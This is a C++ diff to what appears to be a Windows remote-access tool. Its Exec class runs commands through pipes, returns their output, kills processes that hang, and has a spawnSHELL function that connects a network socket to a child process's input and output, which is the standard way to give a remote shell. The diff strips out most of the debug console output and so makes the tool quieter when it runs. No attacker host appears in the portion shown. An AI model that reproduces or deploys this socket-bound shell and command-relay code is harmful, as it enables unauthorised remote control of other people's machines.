@@ -25,7 +25,7 @@ vector<DWORD> Exec::returnPid(string stringTargetProcessName)
 
     if (!Process32FirstW(snap, &entry)) 
     { //start with the first in snapshot
-        wcout << "ERROR" << endl;
+        //wcout << "ERROR" << endl;
     }
 
     do 
@@ -34,7 +34,6 @@ vector<DWORD> Exec::returnPid(string stringTargetProcessName)
         if (wstring(entry.szExeFile) == targetProcessName) 
         {
             pids.push_back(entry.th32ProcessID); //name matches; add to list
-            wcout << "RESULT: " <<entry.th32ProcessID << endl;
         }
     } while (Process32NextW(snap, &entry)); //keep going until end of snapshot
 
@@ -43,7 +42,6 @@ vector<DWORD> Exec::returnPid(string stringTargetProcessName)
 void Exec::setupAllPipe()
 {
     SECURITY_ATTRIBUTES sa; 
-    printf("\n->Start of parent execution.\n");
     // Réglez le drapeau bInheritHandle pour que les poignées de pipe soient héritées. 
     sa.nLength = sizeof(SECURITY_ATTRIBUTES); 
     sa.bInheritHandle = TRUE; 
@@ -113,14 +111,12 @@ PROCESS_INFORMATION Exec::createChildProcess(string &command)
         NULL,          // use parent's current directory 
         &siStartInfo,  // STARTUPINFO pointer 
         &piProcInfo);  // receives PROCESS_INFORMATION
-    
-    cout << "process childen id:  " <<  GetProcessId(piProcInfo.hProcess) << endl; 
    
     BOOL statusObject = WaitForSingleObject(piProcInfo.hProcess, TIMEOUT_CREATE_PROC);
 
     if(statusObject == WAIT_TIMEOUT)
     {
-        cout << "\r\rTIMEOUT!!!!"<< endl;
+        //if timeout
         a_timeout = TRUE;
     }
 
@@ -129,11 +125,9 @@ PROCESS_INFORMATION Exec::createChildProcess(string &command)
     
     CloseHandle(piProcInfo.hProcess);
     CloseHandle(piProcInfo.hThread);
-    cout << "CLOSEEEED" << endl;
     // If an error occurs, exit the application. 
     if (!bSuccess)
     {
-        cout << "Failed create process " << endl;
         a_error = TRUE;
         //exit(1);
     }
@@ -146,10 +140,6 @@ vector<string> Exec::readFromPipe(PROCESS_INFORMATION piProcInfo)
 
     DWORD dwRead; 
     CHAR chBuf[BUFSIZE];
-
-
-    cout << "Read from pipe " << endl;
-    cout << "Current process2: " <<  GetCurrentProcessId() << endl;
 
     string out,err;
     vector<string> result;
@@ -166,8 +156,6 @@ vector<string> Exec::readFromPipe(PROCESS_INFORMATION piProcInfo)
             //cout << "OEF FIND !!" << endl;
             break;
         }
-        cout <<"Size: " <<dwRead << endl;
-        cout << "BUFFER:" <<strlen(chBuf) << endl;
 
         string s(chBuf, dwRead);
 
@@ -213,14 +201,11 @@ vector<string> Exec::executeCommand(string command)
     
     if(a_error)
     {
-        cout << "[+] One or more errors were detected. " << endl; //Go popen ?
         result_of_command.push_back("[-] FATAL ERROR.");
         return result_of_command;
     }
     else
     {
-        cout <<"OUT size: " <<GetFileSize(a_hChildStd_OUT_Rd,NULL) << endl;
-        cout << "ERR size: " << GetFileSize(a_hChildStd_ERR_Rd,NULL) << endl;
         if((GetFileSize(a_hChildStd_OUT_Rd,NULL) == 0) && (GetFileSize(a_hChildStd_ERR_Rd,NULL) == 0)) //error no read in pipes. | if timeout or pipe_err and pipe_our is empty.
         {
             result_of_command.push_back("The command was executed successfully but no data was returned.");
@@ -229,7 +214,6 @@ vector<string> Exec::executeCommand(string command)
         else if(a_timeout) //If the command has passed the timeout then don't read the pipes and try to kill the process that is causing the problem. 
         {
             //test if the process is stuck:
-            cout << "in a_timeout: " << endl;
             vector<DWORD> pids = returnPid((command.substr(0, command.find(" ")))+".exe"); //list all pid
             
             if(!pids.empty()) //if the number of pid found is different from 0 then it means that there are several times the same process
@@ -240,13 +224,12 @@ vector<string> Exec::executeCommand(string command)
                     TerminateProcess(proc, 1);
                     CloseHandle(proc);
                     
-                    cout << "[+] Process: " << pids[i] << " killed" << endl;
+                    //cout << "[+] Process: " << pids[i] << " killed" << endl;
                 }
                 result_of_command.push_back("[-] TIMEOUT IN CREATEPROCESS, but all the processes in the name of: " + (command+".exe") + "we were well and truly killed.");
             }
             else
             {
-                cout << "pids empty" << endl;
                 //esult_of_command = "[-] TIMEOUT IN CREATEPROCESS, but no process was killed.";
                 result_of_command = readFromPipe(piProcInfo);
             }
@@ -278,7 +261,6 @@ void Exec::spawnSHELL(int sock, wchar_t *prog)
     siStartInfo.hStdError = (HANDLE)sock;
    // siStartInfo.wShowWindow = SW_HIDE;
 
-    cout <<"GO" << endl;
     CreateProcessW(NULL,  //command line 
         prog,     // argv of cmd
         NULL,          // process security attributes 
@@ -289,12 +271,10 @@ void Exec::spawnSHELL(int sock, wchar_t *prog)
         NULL,          // use parent's current directory 
         &siStartInfo,  // STARTUPINFO pointer 
         &piProcInfo);  // receives PROCESS_INFORMATION
-    cout << "Wait.." << endl;
-    cout << GetLastError() << endl;
+
     WaitForSingleObject(piProcInfo.hProcess, INFINITE);
     CloseHandle(piProcInfo.hProcess);
     CloseHandle(piProcInfo.hThread);
-    cout << "Close all Handle" << endl;
 }
 
 Exec::~Exec()
